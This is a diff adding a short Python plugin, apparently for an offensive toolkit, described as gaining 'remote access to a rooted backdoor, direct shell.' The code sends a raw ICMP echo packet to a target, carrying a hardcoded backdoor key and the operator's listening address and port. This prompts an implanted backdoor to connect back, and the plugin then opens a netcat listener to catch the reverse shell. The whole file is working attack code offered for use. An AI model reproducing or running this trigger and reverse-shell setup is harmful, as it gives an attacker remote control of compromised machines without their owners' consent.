@@ -1,0 +1,34 @@
+Description = 'Gain remote access to a rooted backdoor, direct shell.'
+
+import os, sys, socket, struct, select
+from plugin_support import *
+
+get.lhost()
+get.lport()
+del sys.modules['dave']
+from dave import *
+
+def main():
+	ICMP_ECHO_REQUEST = 8
+	dest_addr = ask.target
+	key = "aae165395c457c85a925f56d1da23710"
+	reverse_addr = ask.lhost
+	reverse_port = ask.lport
+	before_execute()
+	text("Sending ICMP Request...")
+	icmp = socket.getprotobyname("icmp")
+	my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
+	pkt_id = 0xABCD
+	dest_addr  =  socket.gethostbyname(dest_addr)
+	pkt_checksum = 55555
+	command = key + " " + reverse_addr + " " + reverse_port
+	header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, pkt_checksum, pkt_id, 1)
+	bytesInDouble = struct.calcsize("d")
+	data = command + " " + (192 - bytesInDouble - len(command) - 1) * "Q"
+	packet = header + data
+	my_socket.sendto(packet, (dest_addr, 1))
+	my_socket.close()
+	text("Trying to get shell.")
+	os.system('nc -lvp %s' % (reverse_port))
+
+main()
